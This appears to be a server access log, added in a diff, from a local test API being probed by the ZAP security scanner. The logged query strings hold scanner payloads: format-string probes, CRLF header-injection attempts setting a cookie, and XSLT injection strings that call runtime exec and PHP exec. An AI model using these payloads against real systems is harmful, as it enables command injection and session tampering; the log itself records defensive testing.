cRuiPRlOXJfiktjOsdcqoQeNCCbLktTZiGDgAqrtRYIXfhOlPZUAPrMgSZJuJLgXrstSvNTaUmHZygYNIFrQZfDdKDMPZFOjRtvsZIyFEyjGfmpOAsMpDkPQriiwOcnDfwRLlPmAGhADQgypSMiVpsrHDqsPxYhdGoiRnDpyhXqaGJYuOBBtbcEkMKjJSKfpPoZhqOOeCHNmiybEpOTHrdcMjIBCmgubsCrZChaGqMtfRxEAQfDRYQuPSVBdwtXjSLfgyciffNVxqnKhfYiDhxLwXMmMTbWENcjpBmqMLVCbTCAsBtoOVZNSyQILZdZgawnyLFIdjJrkcebZcPUnOPYQKwRhVsESHsfFyKNcBfbSYqHyusuEppUXEhhBKgWaXUeiFtcJrNQpkRVnFRttLEBIwWAgZlVRMYMLpbLyEbvfQTnEbvhbVYXvJHGdZGUfkBLIGElwTHoLkZqxiZVxRqmccSVxMsTSFREWONWjPTHpxtyDOyedXrKfYWNFICTdGcprrdocDdVWdsDqawahZNREuGftBwcQkwbnMeMpulOtrxALIwHpnKBJjYFIdkVKpsaNuTyhFEPUESovDGBAbipOeLWSFHbNiPnuCOGxbTYwPZeKcQhmSxGXkTDeufYeYuYYaaiXoIIkHDZwFytDtYrINwSXcIpfYHBovajmpYvCsqxLHbeUXwKFassWbMryGqIniPEeRTqbolPPGZnETmdHdiLvrkvYXycIGnZAbTUamRDOoyOxxMOXhemDsWncOnhxmTUbYMAvsjyenVHwaNXpHAgVTLWDPdQhqLiNpdHVJnrNWOaLodqMWxCgibTjpVktGlpVCaDuqnntZfNvmUjmkoNGVgDTaBykKmxkLEYRcAleYApSksEHqGiCScMXgPVZWvTlJwYaSFNFRicnhFNYusakgVWlodTqMhmpIZsuBFPZMHidpeAytUaZsfwHeqnMTsvjskxdKCEuVImVTEbEuOtPrlpeICKiYoTWNLZTYpaGGdGVXHGkpIxWigVioEkSKwSJnJVUrXuxggdqVJGmZAqoUUoQDdYyurMFHWSmamkEbxOsnljytJLHfplcnMUCosYfUtcptSEAwGEsbYHtBKBhYJpMoAZTLvUMGGqFbDNkuINvohm HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=ZAP&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=Set-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=any%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=any%3F%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=any%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=any%3F%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=any%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a%0D%0A&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=any%3F%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a%0D%0A&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=Set-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=any%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=any%3F%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=any%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=any%3F%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=any%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a%0D%0A HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=any%3F%0D%0ASet-cookie%3A+Tamper%3D39d3f0ec-3369-4f34-a886-c924dcce857a%0D%0A HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /auth/actuator/health HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/actuator/health HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=%3C&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=system-property%28%27xsl%3Avendor%27%29%2F%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F127.0.0.1%3A22%27%29%22%2F%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%3C HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=system-property%28%27xsl%3Avendor%27%29%2F%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21-- HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [32938]
